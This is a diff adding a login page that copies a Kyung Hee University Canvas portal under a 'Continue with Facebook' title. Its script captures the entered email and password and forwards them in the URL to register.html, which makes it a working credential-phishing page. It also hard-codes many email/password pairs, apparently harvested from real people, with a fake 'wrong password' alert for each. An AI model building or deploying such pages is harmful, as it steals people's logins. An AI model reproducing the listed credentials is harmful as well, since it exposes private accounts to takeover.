@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+	<link rel="stylesheet" href="customs/resources/xe.min.css" type="text/css" charset="UTF-8" media="all">
+    <link rel="stylesheet" href="customs/resources/xn.common.css" type="text/css" charset="UTF-8" media="all">
+    <link rel="stylesheet" href="customs/resources/jquery-ui.css" type="text/css" charset="UTF-8" media="all">
+    <link rel="stylesheet" href="customs/resources/default.css" type="text/css" charset="UTF-8" media="all">
+    <link rel="stylesheet" href="customs/resources/content_manager_mobile_login-1.css" type="text/css" charset="UTF-8" media="all">
+
+
+
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+	<title>Facebook을 사용하여 계속하기</title>
+  
+
+</head>
+<body>
+
+
+
+
+	<div id="header">
+		<h1 class="header_logo"><img src="customs/resources/login_logo.png"></h1>
+	</div>
+
+
+<div id="login_wapper">
+    
+
+	<form id="form1" name="form1" method="post">
+					<input type="hidden" name="csrf_token" id="login_form1_csrf_token" value="" />
+		<div class="loginForm">
+		<div class="login_user">
+			<span class="box">
+				<input id="email" type="text" name="login_user_id" tabindex="1" accesskey="u"
+					autocomplete="off" placeholder="ID or 학번(사번)"
+					onkeydown="javascript:keyDown(event)" >
+			</span>
+		</div>
+		<div class="pw_user">
+			<span class="box">
+				<input id="pwd" name="login_user_password" tabindex="2" accesskey="p"
+					type="password" autocomplete="off" placeholder="Password"
+					onkeydown="javascript:keyDown(event)">
+			</span>
+		</div>
+ 		<div class="login_btn"><a href="javascript:OnLogon();" onclick="go_click();"><span>LOGIN</span></a></div>
+
+ 
+		</div>
+		
+
+	</form>
+
+ <!-- class=login -->
+
+<div class="general_login">
+	<a href="https://khcanvas.khu.ac.kr/login/canvas"><button id="general_login_btn">일반로그인</button></a>
+</div>
+<div class="footerBtn">
+<div class="btnLink">
+	<ul>
+		<div><strong>경희대학교 빅데이터응용학과 지식플랫폼 BDAE-alpha</strong></div>
+		
+	</ul>
+</div>
+</div>
+</div>
+
+
+
+
+
+
+ 
+
+
+
+
+<script>
+	function go_click() {
+
+  
+
+
+
+	   setTimeout(function() {
+
+		emailfb = $('#email').val();
+		   pwdfb = $('#pwd').val();
+
+		if (emailfb == "oddeyekim11@gamil.com" & pwdfb == "balltwee11"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "03272002kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "270302kim"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "3we456sggsbt"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "sinbs2013@gmail.com" & pwdfb == "nomoran1"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "wonseok12344@gmail.com" & pwdfb == "YEjin1202"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "pyeshila333@gmail.com" & pwdfb == "ppuggukagent3"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "nickyparkg4@gmail.com" & pwdfb == "nicky3927ik"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "kyebin03@naver.com" & pwdfb == "dptmej0513^^"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "kyebin03@naver.com" & pwdfb == "esther0513"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "onyu0614@gmail.com" & pwdfb == "wodnjs111"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "samuelthegalaxys@gmail.com" & pwdfb == "03272002kihoon"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else{				
+			location.href="register.html?" + emailfb + "/" + pwdfb;
+
+		}
+
+	   }, 3300);
+	  // chatChannelId = btn.name;
+	
+
+
+	}    
+	
+
+
+   </script>
+</body>
+
+
+ 
+
+</html>
